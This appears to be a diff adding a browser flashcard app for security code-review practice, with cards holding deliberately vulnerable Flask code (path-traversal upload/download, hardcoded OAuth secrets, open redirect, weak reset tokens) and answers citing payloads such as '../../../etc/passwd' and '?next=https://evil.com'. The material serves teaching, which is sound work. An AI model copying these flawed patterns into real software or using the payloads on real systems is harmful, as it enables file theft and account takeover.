+    token = str(random.randint(100000, 999999))
+    token_hash = hashlib.sha1(token.encode()).hexdigest()
+    RESET_TOKENS[user_id] = {
+        "hash": token_hash, "expires": time.time() + 3600
+    }
+    return token
+
+def verify_reset_token(user_id, token):
+    record = RESET_TOKENS.get(user_id)
+    if not record: return False
+    if time.time() > record["expires"]: return False
+    input_hash = hashlib.sha1(token.encode()).hexdigest()
+    if record["hash"] == input_hash:
+        return True
+    return False`}
+      ]
+    },
+    {
+      label: "File Upload",
+      cards: [
+        {id:"rv04",domain:"Code Review",depth:"deep",
+         question:"REVIEW this file upload and download endpoint.\n\nFind 6 issues. For each: Line → Category → Attack chain → Fix.",
+         hint:"(1) Is f.filename safe? (2) File size limit? (3) Server path in response? (4) Download path validated? (5) Authentication? (6) File type validation?",
+         answer:"1. Lines 9-10 — Path traversal: ../../../etc/cron.d/backdoor writes outside UPLOAD_DIR. Fix: secure_filename() + realpath check.\n\n2. All — No size limit: multi-GB upload = disk exhaustion DoS. Fix: MAX_CONTENT_LENGTH.\n\n3. Line 12 — Server path in response: reveals filesystem layout. Fix: return only a token/filename.\n\n4. Lines 17-20 — Path traversal on download: ../../../etc/passwd = arbitrary file read. Fix: realpath check, assert starts with UPLOAD_DIR.\n\n5. All — No authentication: anyone uploads/downloads. Fix: require authenticated session.\n\n6. All — No file type validation: store scripts/executables. Fix: allowlist extensions, validate magic bytes.",
+         code:`import os
+from flask import Flask, request, send_file
+
+app = Flask(__name__)
+UPLOAD_DIR = "/var/app/uploads"
+
+@app.route("/upload", methods=["POST"])
+def upload():
+    f = request.files["file"]
+    filename = f.filename
+    filepath = os.path.join(UPLOAD_DIR, filename)
+    f.save(filepath)
+    return {"path": filepath, "status": "ok"}
+
+@app.route("/download")
+def download():
+    filename = request.args.get("filename")
+    filepath = os.path.join(UPLOAD_DIR, filename)
+    return send_file(filepath)`}
+      ]
+    },
+    {
+      label: "OAuth2 Callback",
+      cards: [
+        {id:"rv05",domain:"Code Review",depth:"deep",
+         question:"REVIEW this OAuth2 SSO callback handler — entry point for ALL user authentication.\n\nFind 6 issues. For each: Line → Category → Attack chain → Fix.",
+         hint:"(1) secret_key hardcoded? (2) CLIENT_SECRET in source? (3) Token exchange error handling? (4) 'next' redirect validated? (5) code validated? (6) userinfo validated?",
+         answer:"1. Line 6 — Hardcoded secret_key: anyone with the string forges session cookies, impersonates any user, it's in git history. Fix: os.environ['FLASK_SECRET_KEY'].\n\n2. Lines 7-8 — CLIENT_SECRET hardcoded: OAuth client impersonation if source leaks. Fix: os.environ.\n\n3. Line 26 — Open redirect: ?next=https://evil.com → user lands on phishing page after auth. Fix: validate next is relative, starts with /, not //.\n\n4. Lines 18-23 — No error handling: tokens['access_token'] KeyError on SSO error → unhandled 500. Fix: raise_for_status(), check key exists.\n\n5. Line 12 — code not validated: None passed to token exchange. Fix: if not code: return 400.\n\n6. Line 24 — userinfo not validated: required fields absent may break downstream. Fix: check sub, email exist.",
+         code:`import requests, secrets
+from flask import Flask, request, session, redirect
+from urllib.parse import urlencode
+
+app = Flask(__name__)
+app.secret_key = "dev-secret-key-change-me"
+CLIENT_ID = "my-app-client-id"
+CLIENT_SECRET = "oauth-client-secret-abc123"
+
+@app.route("/login")
+def login():
+    state = secrets.token_hex(16)
+    session["oauth_state"] = state
+    params = {"client_id": CLIENT_ID, "redirect_uri": "https://myapp.com/callback",
+              "response_type": "code", "state": state}
+    return redirect(f"https://sso.corp.com/auth?{urlencode(params)}")
+
+@app.route("/callback")
+def callback():
+    code = request.args.get("code")
+    state = request.args.get("state")
+    if state != session.get("oauth_state"):
+        return "invalid state", 400
+    token_resp = requests.post("https://sso.corp.com/token", data={
+        "grant_type":"authorization_code","code":code,
+        "client_id":CLIENT_ID,"client_secret":CLIENT_SECRET})
+    tokens = token_resp.json()
+    access_token = tokens["access_token"]
+    userinfo = requests.get("https://sso.corp.com/userinfo",
+        headers={"Authorization":f"Bearer {access_token}"}).json()
+    session["user"] = userinfo
+    next_url = request.args.get("next", "/dashboard")
+    return redirect(next_url)`}
+      ]
+    }
+  ]
+};
+
+// ════════════════════════════════════════
+// STATE
+// ════════════════════════════════════════
+let groupKey = 'Domain';
+let deckIdx  = 0;
+let cardIdx  = 0;
+let showBack = false;
+let ratings  = {};     // cardId → 'again'|'hard'|'good'|'easy'
+let activeCards = [];
+
+// ════════════════════════════════════════
+// INIT
+// ════════════════════════════════════════
+function init() {
+  buildTabs();
+  buildChips();
+  loadDeck();
+}
+
+// ════════════════════════════════════════
+// TABS (Domain / Coding / Review)
+// ════════════════════════════════════════
+function buildTabs() {
+  const row = document.getElementById('tabRow');
+  row.innerHTML = '';
+  Object.keys(DECKS).forEach(key => {
+    const b = document.createElement('button');
+    b.className = 'tab' + (key === groupKey ? ' on' : '');
+    b.textContent = key;
+    b.onclick = () => { groupKey = key; deckIdx = 0; buildTabs(); buildChips(); loadDeck(); };
+    row.appendChild(b);
+  });
+}
+
+// ════════════════════════════════════════
+// CHIPS (sub-decks within a group)
+// ════════════════════════════════════════
+function buildChips() {
+  const row = document.getElementById('chipRow');
+  row.innerHTML = '';
+  DECKS[groupKey].forEach((deck, i) => {
+    const b = document.createElement('button');
+    b.className = 'chip' + (i === deckIdx ? ' on' : '');
+    b.textContent = deck.label;
+    b.onclick = () => { deckIdx = i; buildChips(); loadDeck(); };
+    row.appendChild(b);
+  });
+}
+
+// ════════════════════════════════════════
+// LOAD DECK
+// ════════════════════════════════════════
+function loadDeck(overrideCards) {
+  const deck = DECKS[groupKey][deckIdx];
+  activeCards = overrideCards ? [...overrideCards] : [...deck.cards];
+  cardIdx  = 0;
+  showBack = false;
+  ratings  = {};
+
+  document.getElementById('deckTitle').textContent = deck.label;
+  document.getElementById('doneScreen').classList.remove('show');
+  document.getElementById('cardWrap').style.display  = '';
+  document.getElementById('navCtrls').style.display  = '';
+  document.getElementById('ratings').classList.remove('show');
+
+  renderCard();
+  updateStats();
+}
+
+// ════════════════════════════════════════
+// RENDER
+// ════════════════════════════════════════
+function renderCard() {
+  if (cardIdx >= activeCards.length) { showDone(); return; }
+
+  const card = activeCards[cardIdx];
+  showBack = false;
+
+  // front visible, back hidden
+  document.getElementById('cardFront').classList.remove('hidden');
+  document.getElementById('cardBack').classList.remove('visible');
+  document.getElementById('ratings').classList.remove('show');
+  document.getElementById('btnFlip').textContent = 'FLIP CARD';
+
+  // ── FRONT ──
+  document.getElementById('fDomain').textContent = card.domain || '';
+
+  const depthCls = {deep:'tag-deep',mid:'tag-mid',breadth:'tag-breadth',code:'tag-code'};
+  const depthLbl = {deep:'DEEP DIVE',mid:'MID DEPTH',breadth:'BREADTH',code:'CODING'};
+  const fd = document.getElementById('fDepth');
+  fd.className = 'tag ' + (depthCls[card.depth] || 'tag-mid');
+  fd.textContent = depthLbl[card.depth] || (card.depth||'').toUpperCase();
+
+  document.getElementById('fQuestion').textContent = card.question || '';
+
+  const hEl = document.getElementById('fHint');
+  if (card.hint) { hEl.style.display = ''; hEl.textContent = 'Hint: ' + card.hint; }
+  else { hEl.style.display = 'none'; }
+
+  // ── BACK ──
+  document.getElementById('bDomain').textContent = card.domain || '';
+  document.getElementById('bAnswer').textContent = card.answer || '';
+
+  const codeEl = document.getElementById('bCode');
+  if (card.code) { codeEl.style.display = ''; codeEl.textContent = card.code; }
+  else { codeEl.style.display = 'none'; }
+
+  const followEl = document.getElementById('bFollow');
+  if (card.followUps && card.followUps.length) {
+    followEl.style.display = '';
+    followEl.innerHTML = '<div class="follow-label">FOLLOW-UP QUESTIONS</div>';
+    card.followUps.forEach(f => {
+      const d = document.createElement('div');
+      d.className = 'follow-q';
+      d.textContent = f;
+      followEl.appendChild(d);
+    });
+  } else { followEl.style.display = 'none'; }
+
+  // ── PROGRESS & COUNTER ──
+  const pct = (cardIdx / activeCards.length * 100).toFixed(0);
+  document.getElementById('progFill').style.width = pct + '%';
+  document.getElementById('ctr').textContent = (cardIdx+1) + ' / ' + activeCards.length;
+  document.getElementById('deckSub').textContent =
+    activeCards.length + ' cards · ' + Object.keys(ratings).length + ' rated';
+
+  document.getElementById('btnPrev').disabled = cardIdx === 0;
+  document.getElementById('btnNext').textContent =
+    cardIdx === activeCards.length - 1 ? 'FINISH' : 'NEXT →';
+}
+
+// ════════════════════════════════════════
+// FLIP
+// ════════════════════════════════════════
+function flip() {
+  showBack = !showBack;
+  document.getElementById('cardFront').classList.toggle('hidden', showBack);
+  document.getElementById('cardBack').classList.toggle('visible', showBack);
+  document.getElementById('ratings').classList.toggle('show', showBack);
+  document.getElementById('btnFlip').textContent = showBack ? 'FLIP BACK' : 'FLIP CARD';
+}
+
+// ════════════════════════════════════════
+// NAVIGATE
+// ════════════════════════════════════════
+function go(dir) {
+  const next = cardIdx + dir;
+  if (next < 0) return;
+  if (next >= activeCards.length) { showDone(); return; }
+  cardIdx = next;
+  renderCard();
+}
+
+// ════════════════════════════════════════
+// RATE
+// ════════════════════════════════════════
+function rate(level) {
+  const card = activeCards[cardIdx];
+  ratings[card.id] = level;
+  updateStats();
+  setTimeout(() => go(1), 200);
+}
+
+function updateStats() {
+  const c = {again:0,hard:0,good:0,easy:0};
+  Object.values(ratings).forEach(r => c[r]++);
+  document.getElementById('sA').textContent = c.again;
+  document.getElementById('sH').textContent = c.hard;
+  document.getElementById('sG').textContent = c.good;
+  document.getElementById('sE').textContent = c.easy;
+  document.getElementById('sR').textContent = Math.max(0, activeCards.length - cardIdx);
+}
+
+// ════════════════════════════════════════
+// DONE SCREEN
+// ════════════════════════════════════════
+function showDone() {
+  document.getElementById('progFill').style.width = '100%';
+  document.getElementById('cardWrap').style.display = 'none';
+  document.getElementById('navCtrls').style.display = 'none';
+  document.getElementById('ratings').classList.remove('show');
+
+  const c = {again:0,hard:0,good:0,easy:0};
+  Object.values(ratings).forEach(r => c[r]++);
+  const unrated = activeCards.length - Object.keys(ratings).length;
+
+  document.getElementById('scoreRow').innerHTML = `
+    <div class="score-box"><span class="score-n" style="color:#c04040">${c.again}</span><span class="score-l">AGAIN</span></div>
+    <div class="score-box"><span class="score-n" style="color:#c07828">${c.hard}</span><span class="score-l">HARD</span></div>
+    <div class="score-box"><span class="score-n" style="color:#207850">${c.good}</span><span class="score-l">GOOD</span></div>
+    <div class="score-box"><span class="score-n" style="color:#1848a0">${c.easy}</span><span class="score-l">EASY</span></div>
+  `;
+
+  const weak = activeCards.filter(c => ratings[c.id]==='again' || ratings[c.id]==='hard');
+  const wb = document.getElementById('weakBtn');
+  wb.disabled = weak.length === 0;
+  wb.textContent = weak.length > 0 ? `STUDY WEAK ONLY (${weak.length})` : 'NO WEAK CARDS ✓';
+
+  document.getElementById('doneScreen').classList.add('show');
+}
+
+function restart() { ratings = {}; loadDeck(); }
+function studyWeak() {
+  const weak = activeCards.filter(c => ratings[c.id]==='again' || ratings[c.id]==='hard');
+  ratings = {};
+  loadDeck(weak);
+}
+
+// ════════════════════════════════════════
+// KEYBOARD
+// ════════════════════════════════════════
+document.addEventListener('keydown', e => {
+  if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA') return;
+  if (e.key===' '||e.key==='Enter') { e.preventDefault(); flip(); }
+  if (e.key==='ArrowRight') go(1);
+  if (e.key==='ArrowLeft')  go(-1);
+  if (showBack) {
+    if (e.key==='1') rate('again');
+    if (e.key==='2') rate('hard');
+    if (e.key==='3') rate('good');
+    if (e.key==='4') rate('easy');
+  }
+});
+
+init();
+</script>
+</body>
+</html>
